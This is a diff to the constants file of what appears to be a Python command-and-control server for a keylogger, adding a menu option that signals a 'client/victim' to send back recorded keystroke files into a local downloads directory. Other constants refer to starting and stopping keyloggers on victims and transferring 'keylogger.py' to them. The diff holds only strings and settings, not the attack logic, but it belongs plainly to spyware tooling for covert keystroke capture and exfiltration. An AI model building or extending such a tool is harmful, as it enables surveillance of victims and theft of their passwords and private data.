@@ -53,6 +53,7 @@ BYTE_LIMIT = 1024
 MIN_BUFFER_SIZE = 200
 MENU_ACTION_START_MSG = "\n[+] ACTION SELECTED: Now performing menu item {}:"
 RETURN_MAIN_MENU_MSG = "[+] Now returning to main menu..."
+DOWNLOADS_DIR = "downloads"
 
 # GENERAL CONSTANTS
 CLIENT_LIST_EMPTY_ERROR = ("[+] ERROR: The command server is not connected to any clients! (TIP: Consider using "
@@ -81,7 +82,6 @@ KEYLOG_STATUS_TRUE_ERROR_SUGGEST = "[+] TIP: Stop the keylogger for this specifi
 STOP_KEYLOG_SUGGESTION_MSG = ("[+] TIP: To save and record keystrokes for this client (IP: {}, Port: {}), select "
                               "menu item 2 (Stop Keylogger) after return to main menu")
 
-
 # MENU ITEM 2 - Stop Keylogger constants
 STOP_KEYLOG_INITIAL_MSG = "[+] [MENU ITEM 2] - Now stopping keylogger on the client/victim side..."
 STOP_KEYLOGGER_MENU_PROMPT = ("[+] ERROR: This option can only be called when starting a keylogger (menu option 1) "
@@ -102,7 +102,6 @@ ENTER_TARGET_PORT_DISCONNECT_PROMPT = "[+] Enter victim port to disconnect from:
 DISCONNECT_ERROR_KEYLOG_TRUE = ("[+] DISCONNECT ERROR: Cannot disconnect from the following client (IP: {}, Port: {}) "
                                 " as they're currently running a keylogger program!")
 
-
 # MENU ITEM 3 - TRANSFER KEYLOG Constants
 KEYLOG_FILE_NAME = "keylogger.py"
 TRANSFER_KEYLOG_MSG = "GET KEYLOG"
@@ -117,8 +116,27 @@ ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to trans
 ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer file to: "
 FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR = ("[+] ERROR: Cannot transfer keylog file! : The command server is not "
                                             "connected to any clients")
-FILE_TRANSFER_KEYLOG_TRUE_ERROR = ("[+] FILE TRANSFER ERROR: Cannot disconnect from the following client (IP: {}, "
-                                   "Port: {}) as they're currently running a keylogger program!")
+FILE_TRANSFER_KEYLOG_TRUE_ERROR = ("[+] FILE TRANSFER ERROR: Cannot transfer keylog program to the following client ("
+                                   "IP: {}, Port: {}) as they're currently running a keylogger program!")
+
+# MENU ITEM 4 - GET KEYLOG FILE Constants
+TRANSFER_KEYLOG_FILE_SIGNAL = "TRANSFER FILE"
+GET_KEYLOG_FILE_NO_CLIENTS_ERROR = "[+] GET_KEYLOG_FILE_ERROR: The command server is not connected to any clients"
+GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR = (
+    "[+] GET_KEYLOG_FILE_ERROR: Cannot get recorded keylog file(s) from the following client (IP: {}, Port: {}) as "
+    "they're currently running a keylogger program!")
+SEND_GET_KEYLOG_SIGNAL_PROMPT = ("[+] SENDING SIGNAL: Sending signal to client/victim to "
+                                 "transfer recorded keylog files...")
+GET_KEYLOG_PROCESS_MSG = ("[+] SEARCHING CLIENT: Now searching client/victim (IP: {}, Port: {}) "
+                          "for any potentially recorded keylog '.txt' files...")
+CREATE_DOWNLOAD_DIRECTORY_PROMPT = "[+] CREATING DIRECTORY: Now creating the following directory: {}"
+DIRECTORY_SUCCESS_MSG = "[+] OPERATION SUCCESS: The directory has been successfully created!"
+READ_MODE = "r"
+FILE_CANNOT_OPEN_ERROR = "[+] ERROR: An error has occurred while opening {} : {}"
+FILE_CANNOT_OPEN_TO_SENDER = "File has been received, but is either corrupted or not present"
+RECEIVING_FILE_MSG = "[+] Receiving file: {}"
+WRITE_BINARY_MODE = "wb"
+TRANSFER_SUCCESS_MSG = "[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully!"
 
 
 # MENU ITEM 12 - Connect to a specific victim
